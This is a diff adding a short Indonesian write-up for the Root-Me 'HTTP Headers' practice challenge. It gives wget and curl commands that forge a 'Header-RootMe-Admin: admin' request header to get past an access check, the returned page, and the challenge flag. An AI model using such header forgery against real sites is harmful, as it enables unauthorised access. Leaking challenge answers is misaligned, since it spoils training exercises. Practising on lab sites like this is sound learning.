@@ -1,0 +1,31 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch5/
+	
+	Challenge's Name : HTTP Headers
+	
+	Solusi : Akses file soal dengan menggunakan Live http header addon mozila
+	Terlihat respon Header-RootMe-Admin: none
+	
+	Pada soal meminta Get an administrator access to the webpage.
+	
+	Ubah respon Header-RootMe-Admin: admin
+	
+	atau dapat langsung wget dengan command wget 
+	
+	wget -O index.html --header="Header-RootMe-Admin: admin" http://challenge01.root-me.org/web-serveur/ch5/;cat index.html
+	
+	Result : 
+  <html>
+    <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <p>Content is not the only part of an HTTP response!</p>
+    <p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful</p>
+    </body>
+  </html>
+	
+	Command curl : 
+	
+	curl -H "Header-RootMe-Admin:admin" http://challenge01.root-me.org/web-serveur/ch5/
+	
+	Flag : HeadersMayBeUseful
+	
